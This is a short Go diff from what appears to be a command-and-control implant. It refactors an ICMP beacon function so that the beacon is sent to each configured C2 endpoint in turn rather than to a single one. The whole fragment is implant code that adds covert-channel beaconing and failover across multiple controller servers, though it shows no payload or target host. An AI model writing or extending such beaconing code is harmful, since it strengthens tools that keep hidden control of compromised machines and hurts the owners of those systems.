@@ -34,12 +34,12 @@ func sendICMPBeacon(body []byte) []byte {
 	if C2URL == "" {
 		return nil
 	}
-	hostPort, _, ok := currentC2Dial()
-	if !ok {
-		return nil
-	}
-	host := hostnameFromHostPort(hostPort)
+	return forEachC2Endpoint("icmp", func(_ int, _ string, hostPort, _ string) []byte {
+		return sendICMPBeaconTo(hostnameFromHostPort(hostPort), body)
+	})
+}
 
+func sendICMPBeaconTo(host string, body []byte) []byte {
 	ips, err := net.LookupIP(host)
 	if err != nil || len(ips) == 0 {
 		return nil
